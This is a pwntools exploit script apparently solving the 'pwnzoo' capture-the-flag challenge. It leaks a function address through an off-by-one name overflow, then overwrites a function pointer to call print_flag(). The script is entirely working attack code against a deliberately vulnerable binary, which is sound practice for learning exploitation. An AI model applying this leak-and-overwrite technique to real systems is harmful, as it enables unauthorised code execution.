from pwn import *
from pwnlib.util import fiddling

context.arch = 'amd64'
p = remote('pwnzoo-7fb58ad8.challenges.bsidessf.net', 1234)

# Figure out print_flag() offset
pwnzoo = ELF('./pwnzoo')
print_flag_offset = pwnzoo.symbols['print_flag'] - pwnzoo.symbols['speak_cat']

# Leak speak_cat() address
p.recv()
p.sendline('c')
p.recv()
name = 'a' * 36 # name off-by-one
p.sendline('a' * 36)
p.recv()
p.sendline('1')
p.recvuntil('My name is ' + name)
got = p.recvuntil('!') 
speak_cat_addr = unpack(got[:-1], 'all')
print_flag_addr = speak_cat_addr + print_flag_offset
log.info('speak_cat_addr ' + hex(speak_cat_addr))
log.info('print_flag_addr ' + hex(print_flag_addr))

# Overwrite speak() function
payload = name + pack(print_flag_addr)
p.recv()
p.sendline('2')
p.recv()
p.sendline(payload)
p.recv()

# Print flag
p.sendline('1')
log.success(p.recv())
